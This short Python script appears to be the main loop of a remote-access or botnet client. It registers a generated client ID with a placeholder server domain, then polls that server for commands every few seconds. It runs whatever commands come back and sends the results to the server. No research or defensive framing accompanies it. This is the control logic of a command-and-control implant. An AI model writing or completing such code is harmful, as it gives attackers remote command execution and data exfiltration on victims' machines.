import time
from client import start,check_server_status, read_or_generate_client_id, send_client_id, check_for_commands, execute_commands, send_data_to_server


if __name__ == "__main__":
    server_address = "your server domaine name"
    
    start() #starup funct
    
    

    while True:
     
        client_id = read_or_generate_client_id()

        
        registration_result = send_client_id(server_address, client_id)
        print(registration_result)

        while True:
            if check_server_status(server_address):
                commands = check_for_commands(server_address, client_id)
                if commands:
                    results = execute_commands(commands, server_address)
                    

                   
                    send_data_to_server(f"{server_address}/results/{client_id}", results)
                time.sleep(5)  
            else:
                
                break  